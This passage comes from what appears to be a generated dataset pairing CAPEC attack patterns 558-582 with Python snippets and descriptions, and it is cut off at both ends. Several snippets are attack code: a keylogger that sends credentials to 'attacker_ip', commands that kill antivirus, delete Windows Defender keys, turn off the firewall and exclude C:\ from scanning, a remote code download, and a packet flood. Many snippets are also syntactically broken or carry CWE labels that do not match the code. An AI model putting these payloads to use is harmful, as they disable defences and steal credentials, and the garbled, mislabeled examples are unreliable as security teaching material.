        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command\n\n# Assuming 'malicious_binary' is a malicious executable\nmalicious_binary = '/path/to/malicious/binary'\n\n# CWE-114: Process Control\n# Replace a trusted executable with the malicious binary\nos.system('cp ' + malicious_binary + ' /usr/bin/trusted_executable')\n\n# CWE-733 and CWE-1037: Compiler/Processor Optimization Removal or Modification of Security-critical Code\n# The following code assumes a security-critical protection mechanism is in place\n# However, compiler/processor optimization may remove or modify this mechanism\n\ndef security_critical_protection():\n    # Security-critical code\n    pass\n\n# CWE-284: Improper Access Control\n# The security_critical_protection function may not be called due to improper access control\nif os.access('/usr/bin/trusted_executable', os.X_OK):\n    security_critical_protection()\n    os.system('/usr/bin/trusted_executable')\n",
        "description": "This code snippet demonstrates the CAPEC of replacing a trusted executable with a malicious version, exploiting weaknesses in privilege management or access control. It uses CWE-284 to bypass access control, CWE-78 to inject malicious OS commands, CWE-114 to execute malicious commands, and CWE-733 and CWE-1037 to potentially remove or modify security-critical code through compiler/processor optimization."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\nsatellite_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-927: Use of Implicit Intent for Sensitive Communication\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\ndef send_disruptive_signal(signal):\n    # CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n    # Overlapping protected and unprotected regions\n    protected_region = b'\\x00\\x01\\x02\\x03\\x04\\x05'\n    unprotected_region = b'\\x06\\x07\\x08\\x09\\x10\\x11'\n    overlap_region = protected_region + unprotected_region\n    \n    # Send disruptive signal\n    satellite_socket.sendto(signal, ('satellite_ip', 8080))\n    \n    # Verify integrity of received message (CWE-924)\n    received_message = satellite_socket.recv(1024)\n    expected_hash = hashlib.sha256(received_message).hexdigest()\n    if expected_hash != 'expected_hash_value':\n        print('Message integrity compromised!')\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\ndef verify_source_of_signal(signal):\n    # Verify source of signal (CWE-940)\n    if signal['source_ip'] != 'expected_source_ip':\n        print('Signal not from expected source!')\n    \n    # Restrict communication channel to intended endpoints (CWE-923)\n    if signal['endpoint'] != 'expected_endpoint':\n        print('Signal not intended for this endpoint!')\n\n# Main function\nif __name__ == '__main__':\n    send_disruptive_signal(b'\\x12\\x13\\x14\\x15')\n    verify_source_of_signal({'source_ip': '1.2.3.4', 'endpoint': 'endpoint1'})",
        "description": "This Python code snippet demonstrates the main idea of the CAPEC, where an adversary sends disruptive signals to a target satellite using a rogue uplink station, disrupting the intended transmission and preventing others within the satellite's footprint from reaching the targeted or neighboring channels. The code incorporates CWEs 1316, 924, 940, 927, and 923, showcasing vulnerabilities in fabric address mapping, message integrity, source verification, implicit intent, and communication channel restriction."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-522: Insufficiently Protected Credentials\n    # Storing passwords in plaintext\n    users = {'admin': 'password123', 'user': 'password123'}\n    if username in users and users[username] == password:\n        return True\n    return False\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# No limit on authentication attempts\nwhile True:\n    username = input('Enter username: ')\n    password = input('Enter password: ')\n    if authenticate(username, password):\n        print('Authenticated successfully!')\n        break\n    print('Invalid credentials. Try again.')\n\n# CWE-308: Use of Single-factor Authentication\n# Using only password for authentication\n# CWE-309: Use of Password System for Primary Authentication\n# Using password system as primary means of authentication\n\n# CWE-262: Not Using Password Aging\n# CWE-263: Password Aging with Long Expiration\n# No password aging mechanism in place\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# Relying solely on password for authentication\n\n# CWE-1273: Device Unlock Credential Sharing\n# No mechanism to prevent sharing of device unlock credentials",
        "description": "This code snippet demonstrates the CAPEC of guessing or obtaining legitimate credentials to achieve authentication. It includes several CWEs, such as insufficiently protected credentials, improper restriction of excessive authentication attempts, use of single-factor authentication, use of password system for primary authentication, not using password aging, password aging with long expiration, reliance on a single factor in a security decision, and device unlock credential sharing. The code stores passwords in plaintext, allows unlimited authentication attempts, and relies solely on passwords for authentication, making it vulnerable to various attacks."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import getpass\nimport os\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n\nusername = 'admin'\npassword = 'password123'\n\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\npassword_expiration_days = 365\n\n# CWE-521: Weak Password Requirements\nmin_password_length = 6\n\n# Authenticating using single-factor authentication\nif len(password) >= min_password_length:\n    if getpass.getuser() == username and getpass.getpass() == password:\n        # Accessing Windows Admin Shares\n        os.system('net use \\\\\\\\localhost\\\\C$')\nelse:\n    print('Authentication failed')",
        "description": "Python code snippet demonstrating the CAPEC of an adversary guessing or obtaining legitimate Windows administrator credentials to access Windows Admin Shares. The code uses single-factor authentication, stores credentials in plaintext, and has weak password requirements, making it vulnerable to various attacks."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-284: Improper Access Control\n# CWE-378: Creation of Temporary File With Insecure Permissions\nwith tempfile.NamedTemporaryFile() as temp:\n    temp.write(b'\\x90\\x90\\x90\\x90')  # Malicious code\n    temp.seek(0)\n    os.system(temp.name)\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\ndef upload_file(file):\n    with open(file, 'rb') as f:\n        content = f.read()\n    with open('/var/www/html/' + file, 'wb') as f:\n        f.write(content)\n\n# CWE-494: Download of Code Without Integrity Check\nimport requests\nurl = 'https://example.com/malicious_code.py'\nresponse = requests.get(url)\nwith open('malicious_code.py', 'wb') as f:\n    f.write(response.content)\nimport malicious_code\n\n# CWE-433: Unparsed Raw Web Content Delivery\nimport http.server\nimport socketserver\n\nPORT = 8000\nHandler = http.server.SimpleHTTPRequestHandler\nwith socketserver.TCPServer(('', PORT), Handler) as httpd:\n    print('serving at port', PORT)\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary manipulating files in a shared location by adding malicious programs, scripts, or exploit code to valid content. It includes CWE-284 by not restricting access to a resource, CWE-378 by creating a temporary file with insecure permissions, CWE-434 by allowing unrestricted upload of a file with a dangerous type, CWE-494 by downloading code without an integrity check, and CWE-433 by delivering unparsed raw web content."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-219: Storage of File with Sensitive Data Under Web Root\n# CWE-433: Unparsed Raw Web Content Delivery\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-494: Download of Code Without Integrity Check\n\ndef upload_file(file):\n    # No access control or validation on the uploaded file\n    with open('/var/www/html/' + file.filename, 'wb') as f:\n        f.write(file.file.read())\n\n    # Execute the uploaded file without verifying its origin or integrity\n    os.system('python /var/www/html/' + file.filename)\n\n# Allow anyone to upload a file\nupload_file(request.files['file'])",
        "description": "This Python code snippet demonstrates a vulnerable web application that allows an adversary to upload malicious content to a website through an open file share. The uploaded file is stored under the web document root with insufficient access control, and then executed without verifying its origin or integrity, potentially leading to local system or administrative privileges."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import os\nimport getpass\n\n# CWE-284: Improper Access Control\n# CWE-603: Use of Client-Side Authentication\nusername = 'admin'\npassword = 'hardcoded_password'\n\nif getpass.getuser() == username:\n    # CWE-520: .NET Misconfiguration: Use of Impersonation\n    # CWE-798: Use of Hard-coded Credentials\n    # CWE-259: Use of Hard-coded Password\n    impersonation_level = 'SeTakeOwnershipPrivilege'\n    os.system(f'runas /user:{username} /savecred \"{impersonation_level}\"')\n    # Modify logon script to maintain persistence or move laterally\n    logon_script = 'C:\\logon_script.bat'\n    with open(logon_script, 'a') as f:\n        f.write('net use \\\\remote_share /user:remote_username *')\n",
        "description": "Python code snippet that demonstrates the CAPEC of modifying logon scripts to maintain persistence or move laterally within an enclave. It uses hard-coded credentials, improper access control, and client-side authentication to bypass security restrictions."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import time\n\n# List of common passwords\npasswords = ['password123', 'letmein', 'iloveyou']\n\n# List of user accounts\nusers = ['user1', 'user2', 'user3', 'user4', 'user5']\n\n# Function to authenticate users\ndef authenticate(username, password):\n    # No password aging mechanism in place\n    # No strong password requirements\n    # Single-factor authentication\n    if username in users and password in passwords:\n        return True\n    else:\n        return False\n\n# Password spraying attack\nfor password in passwords:\n    for user in users:\n        if authenticate(user, password):\n            print(f'Valid credentials found: {user} - {password}')\n        else:\n            print(f'Invalid credentials: {user} - {password}')\n    # Wait for some time to avoid rapid lockouts\n    time.sleep(60)\n",
        "description": "This Python code snippet demonstrates a password spraying attack, where an attacker tries a small list of common passwords against a list of user accounts. The code lacks strong password requirements, password aging mechanisms, and relies on single-factor authentication, making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\npassword = 'mysecretpassword'\n\n# CWE-759: Using a one-way hash without a salt\nhashed_password = hashlib.sha256(password.encode()).hexdigest()\n\n# CWE-760: Using a one-way hash with a predictable salt\nsalt = 'predictable_salt'\nhashed_password_with_salt = hashlib.sha256((password + salt).encode()).hexdigest()\n\n# CWE-592: Authentication Bypass Issues (Deprecated)\n# CWE-217: Failure to Protect Stored Data from Modification (Deprecated)\n# CWE-218: Failure to provide confidentiality for stored data (Deprecated)\n\n# Storing the hashed password in a database or file\npassword_storage = {'user': 'username', 'password': hashed_password_with_salt}\n\n# Later, when authenticating the user\nstored_password = password_storage['password']\ninput_password = 'mysecretpassword'\nsalt = 'predictable_salt'\ninput_hashed_password = hashlib.sha256((input_password + salt).encode()).hexdigest()\n\nif input_hashed_password == stored_password:\n    print('Authenticated successfully!')\nelse:\n    print('Authentication failed!')",
        "description": "This code snippet demonstrates the deprecated CAPEC, which involves authentication bypass issues, failure to protect stored data from modification, and failure to provide confidentiality for stored data. It uses CWE-759 and CWE-760, which are related to the use of one-way hashes without salts or with predictable salts, respectively. The code hashes a password using SHA-256 and stores it in a dictionary. Later, when authenticating the user, it hashes the input password with the same salt and compares it with the stored hash. This code is vulnerable to various attacks, including rainbow table attacks and password cracking."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import getpass\nimport telnetlib\nimport socket\n\nHOST = 'example.com'\nuser = 'admin'\npassword = 'password'\n\ntry:\n    tn = telnetlib.Telnet(HOST)\n    tn.read_until(b'login: ')\n    tn.write(user.encode('ascii') + b'\\n')\n    tn.read_until(b'Password: ')\n    tn.write(password.encode('ascii') + b'\\n')\n    print(tn.read_all().decode('ascii'))\nexcept socket.error:\n    print('Connection failed')\n\n# Using an obsolete function\nimport md5\nm = md5.new()\nm.update(b'Hello')\nprint(m.hexdigest())\n\n# Reliance on DNS Lookups in a Security Decision\nimport dns.resolver\nresult = dns.resolver.resolve('example.com', 'A')\nfor ipval in result:\n    print('IP:', ipval.to_text())\n\n# Failure to provide confidentiality for stored data\nstored_data = 'secret_data'\nprint('Stored data:', stored_data)\n\n# Authentication Bypass Issues\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\nprint(authenticate('admin', 'password'))",
        "description": "This code snippet demonstrates a collection of deprecated and obsolete functions, as well as poor security practices. It includes the use of telnetlib, which is an insecure protocol, and the md5 hashing algorithm, which is obsolete. It also relies on DNS lookups for security decisions and stores sensitive data in plaintext. Finally, it includes a simple authentication function that can be easily bypassed."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import getpass\nimport hashlib\nimport socket\nimport threading\nimport time\n\ndef capture_keystrokes():\n    keystrokes = ''\n    while True:\n        keystroke = getpass.getch()\n        keystrokes += keystroke\n        if keystroke == '\\r':\n            break\n    return keystrokes\n\ndef send_credentials_to_attacker(keystrokes):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('attacker_ip', 12345))\n    s.send(keystrokes.encode())\n    s.close()\n\ndef hard_coded_credentials():\n    username = 'admin'\n    password = 'password123'\n    return username, password\n\ndef weak_password_requirements():\n    password = input('Enter password: ')\n    if len(password) < 8:\n        print('Password is too weak. Please choose a stronger one.')\n        return False\n    return True\n\ndef insufficiently_protected_credentials():\n    username, password = hard_coded_credentials()\n    credentials = f'{username}:{password}'\n    return credentials\n\ndef main():\n    keystrokes = capture_keystrokes()\n    if weak_password_requirements():\n        credentials = insufficiently_protected_credentials()\n        send_credentials_to_attacker(credentials)\n        print('Credentials sent to attacker.')</threading.Thread(target=main).start()\nwhile True:\n    time.sleep(1)",
        "description": "This Python code snippet demonstrates a keylogger that captures user keystrokes, including passwords, and sends them to an attacker. It uses hard-coded credentials, weak password requirements, and insufficiently protected credentials, making it vulnerable to several CWEs."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import os\nimport getpass\nimport ctypes\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nusername = getpass.getuser()\npassword = getpass.getpass('Enter your password: ')\n\n# CWE-214: Invocation of Process Using Visible Sensitive Information\nos.system(f'echo {username}:{password} >> credentials.txt')\n\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nads_stream = open('credentials.txt', 'a+)\nads_stream.write(':'.join([username, password]) + '\\r\\n')\nads_stream.close()\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nprint(f'Username: {username}, Password: {password}')\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\nctypes.windll.advapi32.ImpersonateLoggedOnUser(0)\n",
        "description": "This Python code snippet demonstrates the CAPEC of leveraging a tool to obtain specific information provided by a user of the target system. It uses various CWEs to expose sensitive system information, invoke a process with visible sensitive information, improperly handle Windows alternate data streams, expose sensitive information to an unauthorized actor, and misconfigure .NET impersonation. The code captures the user's username and password, stores them in a file with an alternate data stream, and prints them to the console, all while impersonating the logged-on user."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import socket\n\ntry:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 80))\n    sock.send(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n    response = sock.recv(1024)\n    print(response.decode())\nexcept socket.error as e:\n    pass\n\nimport hashlib\n\nhash = hashlib.md5()\nhash.update(b'password')\nprint(hash.hexdigest())\n\nimport dns.resolver\n\ntry:\n    result = dns.resolver.resolve('example.com', 'A')\n    for ipval in result:\n        print('IP:', ipval.to_text())\nexcept dns.resolver.NoAnswer:\n    pass\n\nimport telnetlib\n\ntn = telnetlib.Telnet('example.com')\nprint(tn.read_until(b'login: '))",
        "description": "This code snippet demonstrates multiple deprecated or obsolete functions and weaknesses. It uses the deprecated socket API to send an HTTP request, ignores exceptions, and uses the obsolete md5 hashing algorithm. Additionally, it relies on DNS lookups for a security decision and uses the deprecated telnetlib module. These weaknesses can lead to authentication bypass issues, failure to protect stored data, and reliance on DNS lookups in a security decision."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import logging\nimport os\nimport git\n\n# CWE-779: Logging of Excessive Data\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# CWE-778: Insufficient Logging\ndef log_security_event(event):\n    if event == 'security_critical':\n        logging.warning('Security event occurred. (Insufficient details)')\n    else:\n        logging.info(event)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo('./')\nprint(repo.git.log())\n\n# CWE-532: Insertion of Sensitive Information into Log File\nlogging.info('User credentials: username= admin, password= password123')\n\n# CWE-294: Authentication Bypass by Capture-replay\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\n# CAPEC: Preventing host-generated logs from being delivered to a central location\nlog_file = 'app.log'\ndef prevent_log_delivery):\n    if os.path.exists(log_file):\n        os.remove(log_file)\n        print('Log file deleted. Logs will not be delivered to central location.')\n    else:\n        print('Log file does not exist. No action taken.')",
        "description": "This Python code snippet demonstrates the CAPEC of preventing host-generated logs from being delivered to a central location, making it difficult to detect indicators of compromise. It also incorporates related CWEs, including excessive logging, insufficient logging, exposure of version-control repository, insertion of sensitive information into log files, and authentication bypass by capture-replay."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import os\n\n# CWE-774: No limit on file descriptors\nfile_descriptors = {}\ndef upload_file(file_name, file_content):\n    file_descriptors[file_name] = open(file_name, 'wb')\n    file_descriptors[file_name].write(file_content)\n\n# CWE-434: Unrestricted upload of file with dangerous type\ndef upload_dangerous_file(file_name, file_content):\n    if file_name.endswith('.exe'):\n        return 'File type not allowed'\n    else:\n        upload_file(file_name, file_content)\n        return 'File uploaded successfully'\n\n# CWE-646: Reliance on file name or extension\ndef process_file(file_name):\n    if file_name.endswith('.txt'):\n        print('Processing text file')\n    elif file_name.endswith('.exe'):\n        print('Processing executable file')\n    else:\n        print('Unknown file type')\n\n# CWE-409: Improper handling of highly compressed data\nimport zlib\n\ndef decompress_data(compressed_data):\n    return zlib.decompress(compressed_data)\n\n# CWE-69: Improper handling of Windows ::DATA alternate data stream\nimport ctypes\n\ndef access_alternate_data_stream(file_name):\n    kernel32 = ctypes.windll.kernel32\n    handle = kernel32.CreateFileW(file_name + ':$DATA', 0x40000000, 0, None, 3, 0, None)\n    if handle != -1:\n        kernel32.CloseHandle(handle)\n\n# Main code\nwhile True:\n    file_name = input('Enter file name: ')\n    file_content = input('Enter file content: ')\n    upload_dangerous_file(file_name, file_content.encode())\n    process_file(file_name)\n    access_alternate_data_stream(file_name)\n",
        "description": "This code snippet demonstrates the CAPEC of modifying file contents by adding data to files, which can lead to various attacks and outcomes. It includes CWE-774 by allocating file descriptors without limits, CWE-434 by allowing unrestricted upload of files with dangerous types, CWE-646 by relying on file name or extension, CWE-409 by improperly handling highly compressed data, and CWE-69 by improperly handling Windows ::DATA alternate data stream."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import psutil\n\n# Get a list of all running process\nrunning_processes = [(p.info['pid'], p.info['name'], p.info['username']) for p in psutil.process_iter(['pid', 'name', 'username'])]\n\n# Print the list of running processes\nfor process in running_processes:\n    print(f'Process ID: {process[0]}, Process Name: {process[1]}, Username: {process[2]}')",
        "description": "This code snippet demonstrates the CAPEC of exploiting functionality to identify information about currently running processes on the target system. It uses the psutil library to get a list of all running processes, including their IDs, names, and usernames. This information can be used by an adversary to learn about the target environment and potentially exploit it further. The code relates to CWEs 200, 497, 214, 1229, and 1423, as it exposes sensitive system information to unauthorized actors and uses sensitive information to invoke processes."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import subprocess\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# CWE-1229: Creation of Emergent Resource\n\ndef get_services_info():\n    # Using 'sc' command to get services information\n    sc_output = subprocess.check_output(['sc', 'query', 'type= service']).decode('utf-8')\n    # Using 'tasklist' command to get services information\n    tasklist_output = subprocess.check_output(['tasklist', '/svc']).decode('utf-8')\n    # Using 'net start' command to get services information\n    net_start_output = subprocess.check_output(['net', 'start']).decode('utf-8')\n    return sc_output + '\\n' + tasklist_output + '\\n' + net_start_output\n\nprint(get_services_info())",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting functionality to identify information about services on the target system. It uses the 'sc', 'tasklist', and 'net start' commands to gather sensitive information about the services running on the system, which can be used by an adversary to learn about the target environment and potentially exploit it further. The code embodies CWE-200, CWE-497, CWE-1249, CWE-214, and CWE-1229 by exposing sensitive system information to unauthorized actors and creating emergent resources that can be used maliciously."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import subprocess\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n\ndef get_domain_accounts():\n    # Using 'net user' command to get domain accounts\n    process = subprocess.Popen(['net', 'user'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    output, error = process.communicate()\n    if process.returncode == 0:\n        return output.decode('utf-8').strip()\n    else:\n        return 'Error: ' + error.decode('utf-8').strip()\n\nprint(get_domain_accounts())",
        "description": "This Python code snippet uses the 'net user' command to get a list of domain accounts on the system. The output is then printed to the console. This code embodies the CAPEC of exploiting functionality meant to identify information about domain accounts and their permissions on the target system, which can be used to inform further malicious behavior."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import subprocess\n\ndef get_local_groups():\n    process = subprocess.Popen(['net', 'localgroup'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    output, error = process.communicate()\n    groups = [line.decode('utf-8').strip() for line in output.splitlines() if b'Alias' in line]\n    return groups\n\nprint(get_local_groups())",
        "description": "This Python code snippet uses the subprocess module to execute the 'net localgroup' command, which lists local groups on a Windows system. The output is then parsed to extract the group names. This code embodies the CAPEC idea of exploiting functionality to gather information about user groups and their permissions, which can be used to inform further malicious behavior. The related CWEs are applicable as the code exposes sensitive information (CWE-200), does not properly manage access control lists (CWE-529), and uses sensitive command-line arguments (CWE-214)."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import os\nimport getpass\nimport json\n\nusername = getpass.getuser()\nuser_dir = f'C:\\Users\\{username}'\n\nfiles = os.listdir(user_dir)\nsensitive_files = [file for file in files if file.startswith('ntuser')]\n\nsensitive_info = {}\nfor file in sensitive_files:\n    file_path = os.path.join(user_dir, file)\n    modified_time = os.path.getmtime(file_path)\n    sensitive_info[file] = modified_time\n\nprint(json.dumps(sensitive_info, indent=4))",
        "description": "This Python code snippet exploits the functionality to identify information about the primary users on the target system. It lists the files in the current user's directory, filters out the 'ntuser.dat' file, and retrieves its last modified time, which is synonymous with the last login time. The sensitive information is then printed in JSON format, exposing it to an unauthorized actor."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import os\nimport getpass\nimport logging\n\n# CWE-798: Hard-coded credentials\nusername = 'admin'\npassword = 'password123'\n\n# CWE-284: Improper Access Control\nif getpass.getuser() == username:\n    # CWE-671: Lack of Administrator Control over Security\n    logging.basicConfig(filename='app.log', level=logging.INFO)\n    logging.info('Application started')\n    \n    # CWE-1037 and CWE-733: Optimization Removal or Modification of Security-critical Code\n    try:\n        # Disable security tools\n        os.system('taskkill /im antivirus.exe /f')\n        os.system('reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\" /f')\n        os.system('del /q app.log')\n    except Exception as e:\n        logging.error(str(e))",
        "description": "This Python code snippet demonstrates the CAPEC of disabling security tools by exploiting weaknesses in access control. It uses hard-coded credentials to authenticate, lacks administrator control over security settings, and optimizes away security-critical code. The code kills the antivirus process, deletes registry keys, and removes log files to evade detection."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import os\nimport ctypes\nimport getpass\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-427: Uncontrolled Search Path Element\n# CWE-798: Use of Hard-coded Credentials\n\n# Hard-coded credentials\nusername = 'admin'\npassword = 'password123'\n\n# Uncontrolled search path element\npath = 'C:\\Windows\\System32\\' + username + '.dll'\n\n# External control of system or configuration setting\nos.environ['WINLOGON_DLL'] = path\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# CWE-558: Use of getlogin() in Multithreaded Application\n\n# Impersonation\nimport sys\nimport threading\nfrom ctypes import cdll\n\n# Multithreaded application\ndef load_dll():\n    ctypes.CDLL(path)\n\nthreads = []\nfor i in range(5):\n    t = threading.Thread(target=load_dll)\n    t.start()\n    threads.append(t)\n\nfor t in threads:\n    t.join()\n",
        "description": "This Python code snippet demonstrates the CAPEC of modifying the Winlogon registry key to load a malicious DLL on startup. It uses hard-coded credentials, uncontrolled search path elements, and .NET impersonation misconfiguration to escalate privileges. The code also uses the getlogin() function in a multithreaded context, which can return incorrect values. This code is vulnerable to various forms of attacks, including privilege escalation and code injection."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import time\nimport os\nimport json\n\nclass RemoteSystemProfiler:\n    def __init__(self, target_system):\n        self.target_system = target_system\n\n    def probe_system_config(self):\n        start_time = time.time()\n        response = self.target_system.get_system_config()\n        end_time = time.time()\n        response_time = end_time - start_time\n        if response_time > 2:\n            return {'system_config': response, 'response_time': response_time}\n        else:\n            return {'system_config': 'Access Denied', 'response_time': response_time}\n\n    def probe_system_info(self):\n        try:\n            system_info = self.target_system.get_system_info()\n            return {'system_info': system_info}\n        except Exception as e:\n            return {'system_info': str(e)}\n\n    def probe_search_path(self):\n        search_path = self.target_system.get_search_path()\n        if 'untrusted_path' in search_path:\n            return {'search_path': search_path, 'vulnerability': 'Untrusted Search Path'}\n        else:\n            return {'search_path': search_path}\n\n# Example usage:\nremote_system = RemoteSystemProfiler('https://example.com')\nprint(json.dumps(remote_system.probe_system_config(), indent=4))\nprint(json.dumps(remote_system.probe_system_info(), indent=4))\nprint(json.dumps(remote_system.probe_search_path(), indent=4))",
        "description": "This Python code snippet demonstrates a remote system profiler that actively probes and explores a target system to gather security information. The profiler measures response times to infer system configurations, observes behavioral discrepancies to reveal internal state information, and exposes sensitive system information through untrusted search paths. The code embodies the CAPEC and CWEs by showcasing observable response discrepancies, behavioral discrepancies, timing discrepancies, exposure of sensitive system information, and untrusted search paths."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import os\nimport json\nimport platform\nimport psutil\n\n# CWE-497: Exposure of Sensitive System Information\nsystem_info = {}\nsystem_info['platform'] = platform.system()\nsystem_info['platform-release'] = platform.release()\nsystem_info['platform-version'] = platform.version()\nsystem_info['architecture'] = platform.machine()\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import subprocess; subprocess.run([\"netsh\", \"advfirewall\", \"set\", \"allprofiles\", \"state\", \"off\"])'\nexec(malicious_code)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = 'pywin32'\nimport importlib\nif importlib.util.find_spec(vulnerable_component):\n    print(f'Vulnerable component {vulnerable_component} found')\n\n# CWE-512: Spyware\nspyware_code = 'import getpass; print(getpass.getuser())'\nexec(spyware_code)\n\n# CWE-507: Trojan Horse\ntrojan_horse_code = 'import os; os.system(\"powershell -Command Add-MpPreference -ExclusionPath C:\\\\\")'\nexec(trojan_horse_code)\n\n# Get a listing of security tools installed on the system\nsecurity_tools = []\nfor proc in psutil.process_iter(['pid', 'name', 'username']):\n    try:\n        info = proc.info\n        if 'security' in info['name'].lower() or 'antivirus' in info['name'].lower():\n            security_tools.append(info['name'])\n    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n        pass\n\nsystem_info['security_tools'] = security_tools\n\nprint(json.dumps(system_info, indent=4))",
        "description": "This Python code snippet demonstrates the CAPEC of getting a listing of security tools installed on the system and their configurations. It includes CWE-497 by exposing sensitive system information, CWE-506 by embedding malicious code, CWE-1395 by depending on a vulnerable third-party component, CWE-512 by collecting personally identifiable information, and CWE-507 by containing hidden malicious code. The output is in JSON format."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import socket\nimport threading\nimport os\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-421: Race Condition During Access to Alternate Channel\n\ndef disable_network_route(src_ip, dst_ip, src_port, dst_port):\n    # Create a socket object\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n    \n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # Incorrectly specify the destination IP and port\n    sock.bind((src_ip, src_port))\n    \n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    # Inject errors into the packet to disrupt the communication channel\n    packet = b'\\x00' * 1024\n    sock.sendto(packet, (dst_ip, dst_port))\n    \n    # CWE-421: Race Condition During Access to Alternate Channel\n    # Create a thread to continuously send packets and flood the channel\n    def flood_channel():\n        while True:\n            sock.sendto(packet, (dst_ip, dst_port))\n    \n    threading.Thread(target=flood_channel).start()\n    \n    # Disable the network route by continuously sending packets\n    